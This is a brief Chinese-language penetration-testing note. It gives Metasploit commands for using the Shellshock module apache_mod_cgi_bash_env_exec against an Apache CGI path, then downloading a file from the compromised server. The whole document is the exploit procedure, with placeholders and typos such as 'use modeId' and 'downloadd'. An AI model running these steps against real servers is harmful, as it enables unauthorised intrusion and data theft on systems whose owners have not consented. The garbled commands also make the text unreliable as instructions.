## Apache渗透测试
### 1. 进入msfconsole, 查找apache_mod_cgi_bash_env_exec模块
~~~bash
msfconsole
# 使用上述模块
use modeId
# 配置cgi脚本路径
set targeturi /cgi-bin/bin
# 设置ip
set rhost IP
run

# 下载文件
downloadd fileName
~~~